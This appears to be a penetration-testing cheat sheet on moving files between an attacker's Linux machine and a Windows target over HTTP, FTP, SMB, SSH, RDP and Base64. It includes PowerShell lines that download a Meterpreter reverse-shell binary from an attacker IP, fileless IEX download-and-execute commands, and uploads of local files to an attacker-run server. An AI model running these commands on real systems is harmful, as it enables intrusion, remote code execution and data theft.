# File Transfer

## FTP Transfer (Linux)&#x20;

### Python FTP Server&#x20;

{% code overflow="wrap" %}
```bash
sudo apt install python3-pyftpdlib
python3 -m pyftpdlib --port 21 --write
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (1624).png" alt=""><figcaption></figcaption></figure>

## Web Transfer (Linux)

### Using Python&#x20;

{% code overflow="wrap" %}
```bash
python3 -m http.server <port if you want to specify> 
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (1090).png" alt=""><figcaption></figcaption></figure>

### Using PHP&#x20;

{% code overflow="wrap" %}
```bash
sudo php -S 0.0.0.0:<port>
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (1091).png" alt=""><figcaption></figcaption></figure>

{% hint style="warning" %}
_Note that the PHP server does not provide directory listing. It only allows files to be downloaded directly by specifying their path._
{% endhint %}

### Using Ruby&#x20;

{% code overflow="wrap" %}
```bash
ruby -run -e httpd . -p <port> 
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (1092).png" alt=""><figcaption></figcaption></figure>

### Using busybox&#x20;

{% code overflow="wrap" %}
```bash
busybox httpd -f -p <port>
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (1093).png" alt=""><figcaption></figcaption></figure>

## Web and FTP Download (Windows)

{% hint style="info" %}
_Note that everything shown below was performed with Windows Defender and Windows Firewall enabled, so these techniques should work under the default Windows configuration._
{% endhint %}

### Using curl&#x20;

**Web Download**

{% code overflow="wrap" %}
```powershell
curl <web> -o <file output location> -s
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (1096).png" alt=""><figcaption></figcaption></figure>

**FTP Download**

{% code overflow="wrap" %}
```
curl <ftp> -o <file output location> -s
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (1613).png" alt=""><figcaption></figcaption></figure>

### Using Invoke-WebRequest

**Web Download:**&#x20;

{% code overflow="wrap" %}
```powershell
Invoke-WebRequest http://<attacker-ip>:8000/file.exe -OutFile file.exe
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (1097).png" alt=""><figcaption></figcaption></figure>

**FTP Download:**&#x20;

{% code overflow="wrap" %}
```
Invoke-WebRequest ftp://192.168.16.129/secret.txt -OutFile some_secret_from_linux.txt
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (1614).png" alt=""><figcaption></figcaption></figure>

### Using Net.WebClient

#### 1. DownloadFile

{% hint style="info" %}
_Note that writing full path is mandatory while using the below method._&#x20;
{% endhint %}

**Web Download:**&#x20;

{% code overflow="wrap" %}
```powershell
(New-Object Net.WebClient).DownloadFile('http://192.168.16.129:8080/meterpreter_reverse_tcp.exe','<full path>')
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (1098).png" alt=""><figcaption></figcaption></figure>

**FTP Download:**&#x20;

{% code overflow="wrap" %}
```powershell
(New-Object Net.WebClient).DownloadFile('ftp://192.168.16.129/uless.ps1','C:\Users\arjun\Desktop\useless_script.ps1')
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (1610).png" alt=""><figcaption></figcaption></figure>

#### 2. DownloadFileAsync

**Web Download:**&#x20;

{% code overflow="wrap" %}
```powershell
(New-Object Net.WebClient).DownloadFileAsync('http://192.168.16.129:8080/meterpreter_reverse_tcp.exe','C:\Users\sqluser\temp\webclientasync.exe')
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (1100).png" alt=""><figcaption></figcaption></figure>

**FTP Download:**&#x20;

{% code overflow="wrap" %}
```powershell
(New-Object Net.WebClient).DownloadFileAsync('ftp://192.168.16.129/uless.ps1','C:\Users\arjun\useless_ps1.ps1')
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (1612).png" alt=""><figcaption></figcaption></figure>

#### 3. DownloadString

{% hint style="info" %}
_Note that the DownloadString method return plain string we need to store it into a file for using it._&#x20;
{% endhint %}

**Web Download:**&#x20;

{% code overflow="wrap" %}
```bash
(New-Object Net.WebClient).DownloadString('http://192.168.16.129:8080/meterpreter_reverse_tcp.exe') > stringfiledownload.exe
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (1099).png" alt=""><figcaption></figcaption></figure>

**FTP Download:**&#x20;

{% code overflow="wrap" %}
```powershell
IEX (New-Object Net.WebClient).DownloadString('ftp://192.168.16.129/uless.ps1')
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (1611).png" alt=""><figcaption></figcaption></figure>



### Fileless Execution Method&#x20;

#### 1. Download String

{% hint style="info" %}
_Note that IEX can only execute .ps1 file directly from the web._
{% endhint %}

{% code overflow="wrap" %}
```powershell
(New-Object Net.WebClient).DownloadString('http://192.168.16.129:8000/uless.ps1') | IEX
IEX (New-Object Net.WebClient).DownloadString('http://192.168.16.129:8000/uless.ps1') 
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (1601).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (1602).png" alt=""><figcaption></figcaption></figure>

#### Invoke-WebRequest&#x20;

{% code overflow="wrap" %}
```powershell
Invoke-WebRequest http://192.168.16.129:8000/uless.ps1 | IEX
IEX (Invoke-WebRequest http://192.168.16.129:8000/uless.ps1)
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (1604).png" alt=""><figcaption></figcaption></figure>

## Web Upload (Uploadserver)

### Start Server

{% code overflow="wrap" %}
```bash
python3 -m uploadserver
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (1615).png" alt=""><figcaption></figcaption></figure>

### Invoke-FileUpload (Windows)

We need to add `Invoke-FileUpload` via `PSUpload.ps1` located [here](https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1) through some way.&#x20;

<figure><img src="../../.gitbook/assets/image (1617).png" alt=""><figcaption></figcaption></figure>

{% code overflow="wrap" %}
```powershell
Invoke-FileUpload -Uri http://192.168.16.129:8000/upload -File C:\Windows\System32\drivers\etc\hosts
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (1616).png" alt=""><figcaption></figcaption></figure>

### Using curl (Windows)

{% code overflow="wrap" %}
```cmd
curl.exe -F "files=@C:\Windows\System32\drivers\etc\hosts" http://192.168.16.129:8000/upload
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (1618).png" alt=""><figcaption></figcaption></figure>

## Web Upload (Python Server)

### Start Server&#x20;

**Save the below code in a server.py and start it:**&#x20;

{% code overflow="wrap" %}
```python
from http.server import BaseHTTPRequestHandler, HTTPServer

class Handler(BaseHTTPRequestHandler):
    def do_POST(self):
        length = int(self.headers['Content-Length'])
        data = self.rfile.read(length)

        with open("received.bin", "wb") as f:
            f.write(data)

        self.send_response(200)
        self.end_headers()

HTTPServer(("0.0.0.0", 8080), Handler).serve_forever()
```
{% endcode %}

### Using Invoke-WebRequest (Windows)

#### 1. Using InFile

{% code overflow="wrap" %}
```powershell
Invoke-WebRequest -Uri http://192.168.16.129:8080 -Method POST -InFile C:\Windows\System32\drivers\etc\hosts
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (1619).png" alt=""><figcaption></figcaption></figure>

#### 2. Using Body

{% code overflow="wrap" %}
```powershell
 Invoke-WebRequest -Uri http://192.168.16.129:8080 -Method POST -Body ([IO.File]::ReadAllBytes("C:\Windows\System32\drivers\etc\hosts"))
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (1620).png" alt=""><figcaption></figcaption></figure>

### Using Invoke-RestMethod (Windows)

{% code overflow="wrap" %}
```powershell
Invoke-RestMethod -Uri http://192.168.16.129:8080 -Method POST -InFile C:\Windows\System32\drivers\etc\hosts
 Invoke-RestMethod -Uri http://192.168.16.129:8080 -Method POST -Body ([IO.File]::ReadAllBytes("C:\Windows\System32\drivers\etc\hosts"))
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (1621).png" alt=""><figcaption></figcaption></figure>

### Using Net.WebClient (Windows)

{% code overflow="wrap" %}
```powershell
$wc = New-Object System.Net.WebClient
$wc.UploadFile("http://192.168.16.129:8080","POST","C:\Windows\System32\drivers\etc\hosts")
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (1622).png" alt=""><figcaption></figcaption></figure>

## FTP Upload (Windows)

### Using curl

{% code overflow="wrap" %}
```
curl.exe -T .\secret.txt ftp://192.168.16.129
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (1625).png" alt=""><figcaption></figcaption></figure>

### Using Net.Webclient

{% code overflow="wrap" %}
```powershell
$wc = New-Object System.Net.WebClient
$wc.UploadFile("ftp://192.168.16.129/secret.txt",".\secret.txt")
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (1626).png" alt=""><figcaption></figcaption></figure>

## SMB Transfer

### Using Impacket (Linux)

{% code overflow="wrap" %}
```powershell
impacket-smbserver share -smb2support /root/web/
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (1607).png" alt=""><figcaption></figcaption></figure>

### Using copy (Windows)

{% code overflow="wrap" %}
```cmd
net use \\192.168.16.129\share /user:test test
copy \\192.168.16.129\share\password.txt
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (1608).png" alt=""><figcaption></figcaption></figure>

### Uploading file&#x20;

{% code overflow="wrap" %}
```cmd
copy .\secret.txt \\192.168.16.129\share\secret.txt
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (1623).png" alt=""><figcaption></figcaption></figure>

## SSH Transfer

### Using SCP&#x20;

#### Upload a file

{% code overflow="wrap" %}
```cmd
scp nexploit@192.168.16.129:/home/kali/secret.txt .
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (1627).png" alt=""><figcaption></figcaption></figure>

#### Download a File

{% code overflow="wrap" %}
```cmd
scp helloworld.txt nexploit@192.168.16.129:/home/kali/
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (1628).png" alt=""><figcaption></figcaption></figure>

## RDP Transfer

### Using xfreerdp&#x20;

{% code overflow="wrap" %}
```bash
xfreerdp /v:192.168.16.132 /u:arjun /p:'P@$$w0rd' /drive:linux,/root/web/
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (1629).png" alt=""><figcaption></figcaption></figure>

## Hybrid Methods&#x20;

### Using Base64&#x20;

{% hint style="warning" %}
_Note that this method of file transfer using Base64 is sufficient for small files only, up to a size of a few megabytes._&#x20;
{% endhint %}

#### Sender Side

1. **Windows**

{% code overflow="wrap" %}
```powershell
[Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes((Get-Content .\secret.txt -Raw)))
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (1086).png" alt=""><figcaption></figcaption></figure>

2. **Linux**

{% code overflow="wrap" %}
```bash
cat secret.txt | base64
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (1087).png" alt=""><figcaption></figcaption></figure>

#### Receiver Side&#x20;

1. **Windows**

{% code overflow="wrap" %}
```powershell
[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String(<encoded string>))
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (1088).png" alt=""><figcaption></figcaption></figure>

2. **Linux**

{% code overflow="wrap" %}
```bash
echo "<encoded string>" | base64 -d
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (1089).png" alt=""><figcaption></figcaption></figure>
